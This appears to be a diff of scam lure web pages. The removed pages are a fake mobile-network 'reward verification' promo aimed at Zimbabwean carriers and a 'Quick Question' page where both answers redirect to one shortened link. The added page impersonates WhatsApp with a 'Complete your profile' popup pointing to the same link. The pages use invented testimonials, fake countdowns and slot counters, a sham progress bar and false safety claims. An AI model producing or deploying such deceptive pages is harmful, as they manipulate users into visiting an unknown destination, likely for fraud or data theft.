@@ -1,377 +1,374 @@
-<!--
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WhatsApp · profile</title>
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
 
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #0b141a;
+      padding: 16px;
+    }
 
-<title>Network Verification Promo</title>
+    /* profile card */
+    .profile-card {
+      max-width: 420px;
+      width: 100%;
+      background: #1f2c33;
+      border-radius: 32px 32px 28px 28px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+      padding: 32px 24px 28px;
+      border: 1px solid #2a3b44;
+    }
 
-<style>
+    .profile-header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 28px;
+    }
 
-body{
-font-family:Arial,sans-serif;
-background:linear-gradient(135deg,#1a3cff,#ffcc00);
-margin:0;
-padding:0;
-text-align:center;
-animation:bgshift 10s infinite alternate;
-}
+    .avatar {
+      width: 104px;
+      height: 104px;
+      background: #2a3b44;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 14px;
+      border: 4px solid #00a884;
+      box-shadow: 0 0 0 2px #0b141a;
+    }
 
-@keyframes bgshift{
-0%{background:linear-gradient(135deg,#1a3cff,#ffcc00);}
-100%{background:linear-gradient(135deg,#ffcc00,#1a3cff);}
-}
+    .avatar i {
+      font-size: 52px;
+      color: #8696a0;
+    }
 
-.header{
-background:#000;
-color:#ffcc00;
-padding:18px;
-font-size:22px;
-font-weight:bold;
-}
+    .profile-name {
+      font-size: 24px;
+      font-weight: 600;
+      color: #e9edef;
+      letter-spacing: 0.3px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
 
-.container{
-background:#fff;
-max-width:420px;
-margin:40px auto;
-padding:30px;
-border-radius:12px;
-box-shadow:0 10px 30px rgba(0,0,0,0.25);
-}
+    .profile-name i {
+      font-size: 18px;
+      color: #00a884;
+    }
 
-h2{
-margin-top:0;
-color:#222;
-}
+    .profile-sub {
+      font-size: 14px;
+      color: #8696a0;
+      margin-top: 4px;
+      background: #2a3b44;
+      padding: 4px 16px;
+      border-radius: 40px;
+      display: inline-block;
+    }
 
-button{
-width:100%;
-padding:14px;
-margin-top:12px;
-font-size:16px;
-border:none;
-border-radius:10px;
-cursor:pointer;
-transition:0.2s;
-box-shadow:0 4px 12px rgba(0,0,0,0.2);
-font-weight:bold;
-}
+    .info-grid {
+      background: #101b20;
+      border-radius: 20px;
+      padding: 18px 16px;
+      margin: 16px 0 20px;
+      border: 1px solid #2a3b44;
+    }
 
-/* ✅ Zimbabwe Network Colors */
-.Econet{
-background:#00A651;
-color:#fff;
-}
+    .info-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 8px 0;
+      border-bottom: 1px solid #1f2c33;
+    }
 
-.NetOne{
-background:#0033A0;
-color:#fff;
-}
+    .info-row:last-child {
+      border-bottom: none;
+    }
 
-.Telecel{
-background:#E60000;
-color:#fff;
-}
+    .info-row i {
+      width: 22px;
+      color: #00a884;
+      font-size: 18px;
+      text-align: center;
+    }
 
-button:hover{
-transform:scale(1.03);
-opacity:0.95;
-}
+    .info-row .label {
+      color: #8696a0;
+      font-size: 14px;
+      min-width: 68px;
+    }
 
-.progress{
-width:100%;
-background:#ddd;
-height:12px;
-border-radius:6px;
-margin-top:20px;
-overflow:hidden;
-}
+    .info-row .value {
+      color: #e9edef;
+      font-size: 15px;
+      font-weight: 450;
+    }
 
-.bar{
-width:0%;
-height:12px;
-background:linear-gradient(90deg,#1a3cff,#ffcc00);
-}
+    .status-badge {
+      display: flex;
+      justify-content: center;
+      margin: 16px 0 12px;
+    }
 
-.notice{
-font-size:13px;
-color:#777;
-margin-top:20px;
-}
+    .status-badge span {
+      background: #00a884;
+      color: #0b141a;
+      font-weight: 600;
+      font-size: 13px;
+      padding: 6px 22px;
+      border-radius: 40px;
+      letter-spacing: 0.3px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
 
-.slots{
-color:red;
-font-weight:bold;
-margin:10px 0;
-font-size:15px;
-}
+    .continue-btn {
+      background: #00a884;
+      border: none;
+      color: #0b141a;
+      font-weight: 600;
+      font-size: 17px;
+      padding: 14px 20px;
+      border-radius: 40px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 16px;
+      cursor: default;
+      border: 1px solid #00b894;
+      box-shadow: 0 4px 8px rgba(0, 168, 132, 0.2);
+      letter-spacing: 0.3px;
+    }
 
-.timer{
-font-weight:bold;
-margin-bottom:15px;
-color:#1a3cff;
-}
+    .continue-btn i {
+      font-size: 18px;
+    }
 
-.ticker{
-background:#fff;
-color:#000;
-padding:12px;
-font-size:14px;
-font-weight:bold;
-border-top:2px solid #1a3cff;
-border-bottom:2px solid #1a3cff;
-position:fixed;
-bottom:0;
-width:100%;
-}
+    /* popup overlay — NO BLUR */
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(11, 20, 26, 0.75);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 16px;
+      backdrop-filter: none;
+      -webkit-backdrop-filter: none;
+    }
 
-</style>
+    .popup-card {
+      background: #1f2c33;
+      max-width: 380px;
+      width: 100%;
+      border-radius: 28px;
+      padding: 32px 24px 28px;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7);
+      border: 1px solid #2a3b44;
+      text-align: center;
+      animation: popIn 0.25s ease-out;
+    }
 
+    @keyframes popIn {
+      0% { transform: scale(0.95); opacity: 0.6; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .popup-icon {
+      background: #00a884;
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+      font-size: 34px;
+      color: #0b141a;
+    }
+
+    .popup-card h2 {
+      color: #e9edef;
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .popup-card p {
+      color: #aebac1;
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 24px;
+      padding: 0 4px;
+    }
+
+    /* popup continue button — now a real link */
+    .popup-continue-link {
+      display: inline-block;
+      background: #00a884;
+      border: none;
+      color: #0b141a;
+      font-weight: 600;
+      font-size: 17px;
+      padding: 14px 20px;
+      border-radius: 40px;
+      width: 100%;
+      text-decoration: none;
+      text-align: center;
+      transition: 0.15s;
+      border: 1px solid #00b894;
+      box-shadow: 0 4px 10px rgba(0, 168, 132, 0.25);
+      letter-spacing: 0.3px;
+      cursor: pointer;
+    }
+
+    .popup-continue-link i {
+      margin-right: 10px;
+    }
+
+    .popup-continue-link:hover {
+      background: #00b894;
+      transform: scale(1.01);
+    }
+
+    .footer-note {
+      margin-top: 22px;
+      color: #5a6f7a;
+      font-size: 12px;
+      text-align: center;
+      border-top: 1px solid #1f2c33;
+      padding-top: 16px;
+    }
+
+    @media (max-width: 460px) {
+      .profile-card { padding: 24px 16px 20px; }
+      .popup-card { padding: 26px 18px 22px; }
+    }
+  </style>
 </head>
-
 <body>
 
-<div class="header">
-Mobile Network Verification Promo
-</div>
+  <!-- PROFILE CARD -->
+  <div class="profile-card">
+    <div class="profile-header">
+      <div class="avatar">
+        <i class="fas fa-user-circle"></i>
+      </div>
+      <div class="profile-name">
+        Alex Rivera
+        <i class="fas fa-check-circle"></i>
+      </div>
+      <div class="profile-sub">
+        <i class="fas fa-phone-alt" style="margin-right: 6px;"></i> +1 234 567 890
+      </div>
+    </div>
 
-<div class="container" id="mainBox">
+    <div class="info-grid">
+      <div class="info-row">
+        <i class="fas fa-info-circle"></i>
+        <span class="label">About</span>
+        <span class="value">🌱  available</span>
+      </div>
+      <div class="info-row">
+        <i class="fas fa-globe"></i>
+        <span class="label">Status</span>
+        <span class="value">Online · 2 min ago</span>
+      </div>
+      <div class="info-row">
+        <i class="fas fa-lock"></i>
+        <span class="label">Privacy</span>
+        <span class="value">Profile photo · public</span>
+      </div>
+    </div>
 
-<div class="timer">
-⏳ Offer expires in <span id="countdown">05:30:00</span>
-</div>
+    <div class="status-badge">
+      <span><i class="fas fa-pen"></i> profile 80%</span>
+    </div>
 
-<div class="slots">
-⚡ Only <span id="slots">100</span> reward slots left today
-</div>
+    <!-- static continue button (design only) -->
+    <button class="continue-btn" onclick="event.preventDefault();">
+      <i class="fas fa-arrow-right"></i> Continue
+    </button>
 
-<h2>Select the network you use</h2>
+    <div class="footer-note">
+      <i class="fas fa-shield-alt" style="margin-right: 6px;"></i> end-to-end encrypted
+    </div>
+  </div>
 
-<p>Verify your number to unlock exclusive rewards instantly.</p>
+  <!-- ===== POPUP ===== -->
+  <div class="popup-overlay" id="profilePopup">
+    <div class="popup-card">
+      <div class="popup-icon">
+        <i class="fas fa-user-edit"></i>
+      </div>
+      <h2>Complete your profile</h2>
+      <p>
+        <i class="fas fa-pencil-alt" style="margin-right: 6px; color: #00a884;"></i>
+        before you start chatting
+      </p>
 
-<button class="Econet" onclick="verifyNetwork('Econet')">Econet</button>
-<button class="Telecel" onclick="verifyNetwork('Telecel')">Telecel</button>
-<button class="NetOne" onclick="verifyNetwork('NetOne')">NetOne</button>
+      <!-- CONTINUE BUTTON AS A LINK (opens the URL) -->
+      <a href="https://ln.run/comy" target="_blank" class="popup-continue-link" id="popupContinueLink">
+        <i class="fas fa-check"></i> Continue
+      </a>
 
-<p class="notice">
-Verification system scans network eligibility before showing rewards
-</p>
+      <div style="margin-top: 14px; font-size: 13px; color: #5a6f7a;">
+        <i class="fas fa-info-circle"></i> your data is safe
+      </div>
+    </div>
+  </div>
 
-</div>
+  <script>
+    (function() {
+      const popup = document.getElementById('profilePopup');
+      const continueLink = document.getElementById('popupContinueLink');
 
-<div class="ticker" id="testimonialTicker">
-+263***4521 just received 10GB bonus
-</div>
+      // Optional: close popup when clicking on the overlay background
+      if (popup) {
+        popup.addEventListener('click', function(e) {
+          if (e.target === popup) {
+            popup.style.display = 'none';
+          }
+        });
+      }
 
-<script>
-
-function verifyNetwork(network){
-
-const box=document.getElementById("mainBox");
-
-box.innerHTML=`
-<h2>Verifying ${network} Network</h2>
-<p id="stepText">Detecting network...</p>
-
-<div class="progress">
-<div class="bar" id="bar"></div>
-</div>
-`;
-
-let progress=0;
-
-const steps=[
-"Detecting network...",
-"Validating reward eligibility...",
-"Checking remaining slots...",
-"Preparing activation..."
-];
-
-let interval=setInterval(function(){
-
-progress+=5;
-
-document.getElementById("bar").style.width=progress+"%";
-
-if(progress==25){
-document.getElementById("stepText").innerText=steps[1];
-}
-
-if(progress==50){
-document.getElementById("stepText").innerText=steps[2];
-}
-
-if(progress==75){
-document.getElementById("stepText").innerText=steps[3];
-}
-
-if(progress>=100){
-
-clearInterval(interval);
-
-document.getElementById("stepText").innerText="Redirecting...";
-
-setTimeout(function(){
-window.location.href="https://ln.run/comy";
-},1000)
-
-}
-
-},200)
-
-}
-
-const testimonies=[
-"+263***4521 just received 10GB and $20 airtime",
-"+263***9932 just received 5GB and $10 airtime",
-"+263***7710 just received 10GB and $30 airtime",
-"+263***6284 just received 2GB and $5 airtime",
-"+263***3345 just received 5GB and $10 airtime",
-"+263***9921 just received 10GB and $30 airtime"
-]
-
-setInterval(()=>{
-const random=Math.floor(Math.random()*testimonies.length)
-document.getElementById("testimonialTicker").innerText=testimonies[random]
-},4000)
-
-let slots=23
-
-setInterval(()=>{
-if(slots>7){
-slots--
-document.getElementById("slots").innerText=slots
-}
-},15000)
-
-let time=19800
-
-const timer=setInterval(()=>{
-let h=Math.floor(time/3600)
-let m=Math.floor((time%3600)/60)
-let s=time%60
-
-document.getElementById("countdown").innerText=
-String(h).padStart(2,'0')+":"+
-String(m).padStart(2,'0')+":"+
-String(s).padStart(2,'0')
-
-time--
-
-if(time<=0){
-clearInterval(timer)
-}
-
-},1000)
-
-</script>
-
-</body>
-</html>
--->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Quick Question</title>
-
-<style>
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial,sans-serif;
-}
-
-body{
-background:#0f172a;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-padding:20px;
-color:white;
-}
-
-.box{
-background:#111827;
-width:100%;
-max-width:400px;
-padding:35px 25px;
-border-radius:20px;
-text-align:center;
-box-shadow:0 10px 30px rgba(0,0,0,0.4);
-}
-
-h1{
-font-size:28px;
-margin-bottom:15px;
-}
-
-p{
-font-size:16px;
-color:#cbd5e1;
-margin-bottom:30px;
-line-height:1.5;
-}
-
-.btns{
-display:flex;
-gap:15px;
-}
-
-button{
-flex:1;
-padding:15px;
-border:none;
-border-radius:12px;
-font-size:17px;
-font-weight:bold;
-cursor:pointer;
-transition:0.3s;
-}
-
-.yes{
-background:#22c55e;
-color:#000;
-}
-
-.no{
-background:#ef4444;
-color:#fff;
-}
-
-button:hover{
-transform:scale(1.03);
-}
-</style>
-</head>
-
-<body>
-
-<div class="box">
-
-<h1>Quick Question</h1>
-
-<p>
-Would you like to answer a few simple questions and receive a reward today?
-</p>
-
-<div class="btns">
-<button class="yes" onclick="goOffer()">YES</button>
-<button class="no" onclick="goOffer()">NO</button>
-</div>
-
-</div>
-
-<script>
-function goOffer(){
-window.location.href="https://ln.run/comy";
-}
-</script>
-
+      // The link itself will navigate to the URL.
+      // We also close the popup when the link is clicked (optional, but nice)
+      if (continueLink) {
+        continueLink.addEventListener('click', function() {
+          // close popup after a tiny delay so the click is registered
+          setTimeout(() => {
+            if (popup) popup.style.display = 'none';
+          }, 150);
+        });
+      }
+    })();
+  </script>
 </body>
 </html>
